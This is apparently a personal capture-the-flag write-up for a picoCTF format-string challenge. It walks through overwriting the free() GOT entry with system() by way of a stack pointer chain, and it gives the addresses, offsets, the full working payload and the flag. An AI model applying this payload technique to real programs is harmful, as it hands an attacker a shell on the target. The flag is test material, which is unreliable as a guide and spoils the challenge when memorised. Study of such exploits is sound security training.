format string vulnerability
the string is stored in the heap
NO PIE

analysis of the server code
    we have a printf statement printing the user value as it is
    this user input is stroed in a 300 byte array in heap
    before exiting from the program we are calling a libc function free(p)
        this p value we can calculate as it is declared before the printf call with vulnerability    
    also we have a system("date") call in the code so we have system function also

goal for the exploit
    we need to call system() function with 'sh\0' string as argument
    to do this we need to first call this system function with appropriate argument

plan for exploit    
    we need to change the free() GOT entry to system() PLT entry
        for this we need to store the address of the free() GOT entry(not value) in the stack somehow
        to store address of the free() GOT entry on stack we have to see if the stack have a address that refer to another stack address
            the RBP pointer pushed in the stack on a function call and then points to that address - best candidate for this
    we need to change the p value in the stack to "sh\0"

gdb analysis to find data to over write
    free PLT address - 0x4006c6
        disassemble free
    free GOT entry address - 0x602018
        disassemble free
    system PLT address - 0x4006f0
        disassemble system
    "sh\0" value in hex little endian - 0x006873
    position of RBP of main(which will point to RBP before main) - 12th
        RBP of main - 0x7fffffffdd10
        RBP of buy_stonks - 0x7fffffffdcd0
        trial and error with printing multiple values from %p and checking if 0x7fffffffdd10 is present in which position
    position of address pointed bye the value in RBP of main - 20th
        we can check the offset of the previous pointer with 
            0x7fffffffdd10 - 0x7fffffffdcd0 = 0x40
                each address is 8 bytes and system is byte addressable
                offset = 0x40//8 = 8
    position of p - 18th
        find where the p is with b *0x00400be2 and examining the RAX register 
            was in 0x6032a0
        now we can check this by same trial and error wher 0x6032a0 is in the %p

developing exploit %c%c%c%c%c%c%c%c%c%c%6299662c%n%216c%20$hhn%10504067c%18$n
    %c%c%c%c%c%c%c%c%c%c%6299662c%n
        store free.GOT address on stack
        to change the value at 12th position is pointing to(the 20th position) to 6299672(0x602018 - free.GOT)
        Note that upon encountering the first format specifier with a $ specifying argument position, printf will go through the format string and save every argument. This means that if we use a $ while writing our target address to the stack, then printf will save the old value and it will have no effect. Therefore, we can not use $ until this address is written.
    %216c%20$hhn
        change the free.GOT value
        to change the value(last byte) at 20th position is pointing to(the free.GOT value) to (6299672+216)(0x6020(f0))
            the previous value was 0x4006c6(free PLT address) which will be changed to 0x4006f0(system PLT address)
            when vulnerable printf is called both free and system is not called so the value of GOT entry for both functions will be PLT addresses
    %10504067c%18$n
        change the p value 
        %10504067c%10$n will also work as the p address is also stored on 10th position
        to change the value at 18th position is pointing to(the p address) to (6299672+216+10504067)(0x1006873 - 'sh\0' with 0x01 extra)

flag - picoCTF{explo1t_m1t1gashuns_0056bab5}